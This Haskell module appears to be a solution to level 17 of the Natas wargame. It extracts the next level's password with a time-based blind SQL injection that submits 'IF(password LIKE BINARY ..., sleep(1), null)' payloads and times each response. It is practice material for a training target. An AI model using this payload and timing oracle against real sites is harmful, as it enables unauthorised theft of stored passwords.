module Natas.Natas17 where

import           Data.Text           (pack)

import           Network.Wreq        (partText)

import           Natas.Inject
import           Natas.Natas

solution :: Solution
solution = injectSolution (attemptPassword . placeAnywhereSql) buildPassword

buildPassword :: String -> String -> IO (Maybe String)
buildPassword = buildPassword' (attemptPassword . (++ "%"))

attemptPassword :: String -> IO Bool
attemptPassword guess = do
  let waitSeconds = 1 :: Double
      sqlInject =
        (pack . concat)
          [ "natas18\" and IF(password LIKE BINARY \""
          , guess
          , "\", sleep("
          , show waitSeconds
          , "), null) -- "]
      form = partText (pack "username") sqlInject
  reqTime <- timeAction_ (postLevel 17 form)
  pure $ realToFrac reqTime >= waitSeconds
